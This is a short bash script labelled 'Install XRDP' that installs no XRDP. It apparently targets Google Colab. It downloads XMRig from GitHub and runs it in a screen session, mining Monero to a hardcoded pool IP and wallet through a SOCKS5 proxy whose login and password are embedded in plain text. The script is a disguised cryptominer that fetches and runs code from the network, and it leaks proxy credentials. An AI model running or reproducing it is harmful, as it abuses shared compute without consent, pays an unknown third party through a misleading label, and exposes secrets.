#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz && cd xmrig-6.16.4 && ./xmrig -a randomx -o stratum+ssl://199.247.19.116:443 --user 83XyjL3d9DFfmwpxrrECoRPQJ1Nap7ujCZ2rBE5qfN7YSStSL7oLoX3GaK4xFXRKxCjUFc8J7oFtZSB7DQd1rwKt4n3HkqC -k --tls --rig-id GC-US --cpu-affinity=0x3 -x socks5://bejrwtmg:ly5780dmuybj@193.8.94.225:9270
